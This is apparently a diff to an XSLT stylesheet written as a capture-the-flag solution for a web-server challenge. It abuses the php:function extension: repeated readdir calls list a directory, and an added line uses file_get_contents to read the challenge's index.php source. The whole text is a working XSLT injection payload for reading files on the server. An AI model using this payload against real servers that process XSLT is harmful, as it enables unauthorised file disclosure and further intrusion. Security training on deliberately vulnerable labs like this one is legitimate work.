@@ -20,5 +20,6 @@
     <xsl:value-of select="php:function('readdir')"/> -
     <xsl:value-of select="php:function('readdir')"/> -
     <xsl:value-of select="php:function('readdir')"/> -
+    <xsl:value-of select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')"/>
   </xsl:template>
 </xsl:stylesheet>
